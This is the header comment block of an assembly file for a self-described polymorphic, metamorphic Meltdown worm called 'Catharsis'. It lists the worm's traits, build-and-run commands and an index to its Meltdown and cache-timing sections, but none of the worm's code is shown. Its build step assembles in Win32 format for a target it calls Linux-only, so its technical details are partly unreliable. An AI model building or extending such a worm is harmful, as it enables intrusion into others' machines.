```;; Catharsis
;;
;; A parasitic meltdown worm
;; Coded by 'HaZel' Timo Sarkar
;; Mostly compiled by gcc with C as host language
;;
;; General sheet of characteristics:
;;    Name of the virus.............: Catharsis
;;    Author........................: Timo 'HaZeL' Sarkar / December 2020
;;    Size..........................: On 1st generation: aprox. 16800 bytes
;;    Targets.......................: Linux only... sorry for that
;;    Encrypted.....................: No
;;    Polymorphic...................: Yes
;;    Metamorphic...................: Yes
;;    Payloads......................: Yes: Stdout
;;
;; To do in next versions: Find bugs and add more comments / work on KASLR
;;
;; To build locally:
;;    $ nasm -fwin32 catharsis.asm
;;    $ gcc catharsis.obj -o catharsis.out
;;    $ chmod a+x catharsis.out
;;    $ ./catharsis.out
;;
;; Quick reference (keyword search):
;;    Variable declaration........................: $define && equ
;;    Beginning of virus..........................: .main:
;;    Meltdown....................................: .dbload:
;;    Cache-resulation............................: .resolution```
